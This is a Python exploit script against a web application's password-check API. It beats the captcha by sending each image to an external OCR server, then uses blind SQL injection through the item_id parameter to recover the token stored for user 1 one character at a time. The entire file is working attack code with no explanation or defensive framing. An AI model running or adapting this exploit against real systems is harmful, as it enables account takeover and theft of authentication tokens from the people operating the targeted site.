import requests
import base64
import sys

if len(sys.argv) < 3:
    print("[+] usage: python3 sqliremote.py http://target http://ocr_server")
    sys.exit()
url = sys.argv[1]
ocr_url = sys.argv[2]
slist = "abcdef1234567890"
token = ""

def ocrimgremote(base64_img):
    return requests.post(ocr_url + '/ocr/b64/text', data=base64_img).text

def getocrcoderemote():
    create_url = url+'/server/index.php?s=/api/common/createCaptcha'
    show_url = url+'/server/index.php?s=/api/common/showCaptcha&captcha_id='
    id = requests.get(create_url).json()['data']['captcha_id']
    img64 = base64.b64encode(requests.get(show_url+id).content)
    code = ocrimgremote(img64)
    return id,code

def sqli(i,s):
    id, code = getocrcoderemote()
    payload = f"1') union select 1,2,3,4,5,substr((select token from user_token where uid=1),{i},1)='{s}',7,8,9,10,11,12--"
    data = {
        "password" : "1",
        "item_id" : payload,
        "captcha" : code,
        "captcha_id" : int(id)
    }
    return requests.post(url+"/server/index.php?s=/api/item/pwd",data)

# 注入

for i in range(1,65):
    for s in slist:
        while True:
            resp = sqli(i,s)
            if "refer_url" in resp.text:
                token += s
                print("[+] token:",token)
                break
            elif "\"error_code\":10206" in resp.text:
                continue
            else:
                break
        if len(token) == i:
            break
        